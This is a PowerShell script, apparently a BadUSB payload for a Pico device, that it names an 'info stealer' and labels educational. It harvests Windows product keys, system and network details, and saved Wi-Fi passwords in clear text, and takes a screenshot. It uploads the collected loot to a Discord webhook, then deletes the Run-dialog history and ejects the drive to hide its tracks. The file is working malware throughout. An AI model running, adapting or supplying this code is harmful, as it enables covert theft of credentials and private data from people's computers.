<#
.SYNOPSIS
    Powershell Info Stealer

.DESCRIPTION
    This script is a information stealer for educational purposes.
    It collects basic system information and can sends it to a Discord webhook.

.AUTHOR
    KaazDW: https://github.com/KaazDW
    With the help of the startrk1995's github repo : https://github.com/startrk1995/BadUSB/tree/main

.BUILD DATES
    2025-September

.NOTES
    - For educational use only.
    - Always review and test scripts before executing on sensitive systems.
#>

# VARIABLES SET-UP
$ErrorActionPreference = "SilentlyContinue"
$timeformat = Get-Date -Format yyyy-MM-dd_HHmm
$hostname = $env:computername
$filetimestamp = $hostname+'_'+$timeformat

# CREATE BASIC LOOT DIR
$BBPath = (gwmi win32_volume -f 'label=''CIRCUITPY''').Name+"loot\$filetimestamp\"
$LootDir = New-Item -ItemType directory -Force -Path "$BBPath"

# CREATE BASIC SYSTEM INFORMATION
"BIOS Information:" >> "$LootDir\computer_info.txt" 
Get-WmiObject -Class Win32_BIOS -ComputerName . >> "$LootDir\computer_info.txt"

"BIOS Windows Serial Key:" >> "$LootDir\computer_info.txt"
wmic path softwarelicensingservice get OA3xOriginalProductKey  >> "$LootDir\computer_info.txt"

"Registry Windows Backup Serial Key:" >> "$LootDir\computer_info.txt"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" | select BackupProductKeyDefault >> "$LootDir\computer_info.txt"

"Basic Computer Info:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_ComputerSystem >> "$LootDir\computer_info.txt"
try {
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $cpu = Get-CimInstance -ClassName Win32_Processor
    $gpu = Get-CimInstance -ClassName Win32_VideoController
    $ram = Get-CimInstance -ClassName CIM_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object -ExpandProperty Sum
    "OS: $($os.Caption) (v$($os.Version))" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "CPU: $($cpu.Name)" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "Coex: $($cpu.NumberOfCores) (Threads: $($cpu.NumberOfLogicalProcessors))" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "RAM: $([math]::Round($ram / 1GB, 2)) Go" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "GPU: $($gpu.Name) (Driver: $($gpu.DriverVersion))" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
} catch {
    "Error while scraping datas: $_" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
}


"Detailed Computer Info:" >> "$LootDir\computer_info.txt"
Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, Version, OSArchitecture, OSLanguage, OSType, OSProductSuite, ServicePackMajorVersion, ServicePackMinorVersion, SuiteMask, Buildnumber, CSName, RegisteredUser, SerialNumber, InstallDate, BootDevice, SystemDevice, SystemDirectory, SystemDrive, WindowsDirectory, LastBootUpTime, LocalDateTime, CountryCode, FreePhysicalMemory, FreeVirtualMemory, CurrentTimeZone, NumberOfProcesses, NumberOfUsers, DataExecutionPrevention_Available, DataExecutionPrevention_32BitApplications >> "$LootDir\computer_info.txt"

"Network Data" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
try {
    $network = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null }
    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    
    "`n[+] Configuration réseau:" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "Local IP address: $($network.IPv4Address.IPAddress)" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "Submask: $($network.IPv4DefaultGateway.NextHop)" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "Public IP address: $publicIP" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    "DNS: $($network.DNSServer.ServerAddresses -join ', ')" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
} catch {
    "Error while scraping datas: $_" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
}

"Wifi knew:" >> "$LootDir\computer_info.txt"
# Not the best way to do it but it works
$profiles = netsh wlan show profiles | Select-String ":\s+(.+?)\s*$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

$wifiInfo = foreach ($profile in $profiles) {
    $profileInfo = (netsh wlan show profile name="$profile" key=clear) -join "`r`n"
    
    "Temp file for Regex: $profile" | Out-File -Append -FilePath "$LootDir\wifi_debug.txt" -Encoding utf8
    $profileInfo | Out-File -Append -FilePath "$LootDir\wifi_debug.txt" -Encoding utf8
    $password = $null
    
    if ($profileInfo -match "Contenu de la cl[^\n]*:\s*([^\n]+)") {
        $password = $matches[1].Trim()
    }
    elseif ($profileInfo -match "Key Content[^\n]*:\s*([^\n]+)") {
        $password = $matches[1].Trim()
    }
    else {
        $lines = $profileInfo -split "`r?`n"
        foreach ($line in $lines) {
            if ($line -match "Contenu de la cl[^:]*:\s*(.+)") {
                $password = $matches[1].Trim()
                break
            }
            elseif ($line -match "Key Content[^:]*:\s*(.+)") {
                $password = $matches[1].Trim()
                break
            }
        }
    }
    
    [PSCustomObject]@{
        PROFILE_NAME = $profile
        PASSWORD = if ($password) { $password } else { "NA" } #Not available
    }
}

$wifiInfo | Format-Table -AutoSize -Wrap | Out-String -Width 4096 | Out-File -FilePath "$LootDir\computer_info.txt" -Append
"`nWireless Information:" | Out-File -FilePath >> "$LootDir\computer_info.txt" -Append -Encoding utf8
Get-Content "$LootDir\wifi_info.txt" | Out-File -FilePath "$LootDir\computer_info.txt" -Append -Encoding utf8

Remove-Item "$LootDir\wifi_debug.txt" -Force # Delete wifi_debug (temp file use to extract infos)

"Disk Space Info:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_LogicalDisk -Filter "DriveType=3" -ComputerName . >> "$LootDir\computer_info.txt"

"Installed Hotfixes:" >> "$LootDir\computer_info.txt"
Get-WmiObject -Class Win32_QuickFixEngineering -ComputerName . >> "$LootDir\computer_info.txt"

# MAKE A SCREENSHOT (MAIN MONITOR IF MULTIPLE)
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
    
    $screenshotPath = "$LootDir\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    
    $graphics.Dispose()
    $bitmap.Dispose()
} catch {
    "Error while screenshot : $_" | Out-File -FilePath "$LootDir\computer_info.txt" -Append
    return $null
}

# DISCORD EXTRACT
$filename = "$LootDir\computer_info.txt"
$fileBinary = [IO.File]::ReadAllBytes($filename)
$enc = [System.Text.Encoding]::GetEncoding("iso-8859-1")
$fileEnc = $enc.GetString($fileBinary)
$boundary = [System.Guid]::NewGuid().ToString() 
$LF = "`n"
$bodyLines = (`

  "--$boundary",`

  "Content-Disposition: form-data; name=`"Filedata`"; filename=`"$filename`"",`

  "Content-Type: application/octet-stream$LF",`

  $fileEnc,`
  
  "--$boundary--"`

) -join $LF
$url="YOUR DISCORD WEBHOOK URL"
$Body=@{ content = "$env:computername Stats from Pico"}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json)
Invoke-webrequest $url -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
#curl.exe -F "file1=@$LootDir\computer_info.txt" $url



# -------------------------------------------------------------------------------------------------------
# CLEAR TRACKS
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

# (New-Object -ComObject Shell.Application).Namespace(17).ParseName((gwmi win32_volume -f 'label=''CIRCUITPY''').Name).InvokeVerb("Eject")
(New-Object -ComObject Shell.Application).Namespace(17).ParseName((Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE Label='CIRCUITPY'").Name).InvokeVerb("Eject")


# -------------------------------------------------------------------------------------------------------
# NOT REALLY INTERRESTING DATAS BUT ITS HERE

# "Session Logon Information:" >> "$LootDir\computer_info.txt"
# Get-WmiObject -Class Win32_LogonSession -ComputerName . >> "$LootDir\computer_info.txt"

# "Service Information:" >> "$LootDir\computer_info.txt"
# Get-WmiObject -Class Win32_Service -ComputerName . | Format-Table -Property Status,Name,DisplayName -AutoSize -Wrap | FL >> "$LootDir\computer_info.txt"

# "Installed Software:" >> "$LootDir\computer_info.txt"
# Get-WmiObject -Class Win32_Product | Select-Object -Property Name | Sort-Object Name >> "$LootDir\computer_info.txt"

# NETWORK ADDRESSES
# "Network Infomation:" >> "$LootDir\computer_info.txt"
# Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> "$LootDir\computer_info.txt"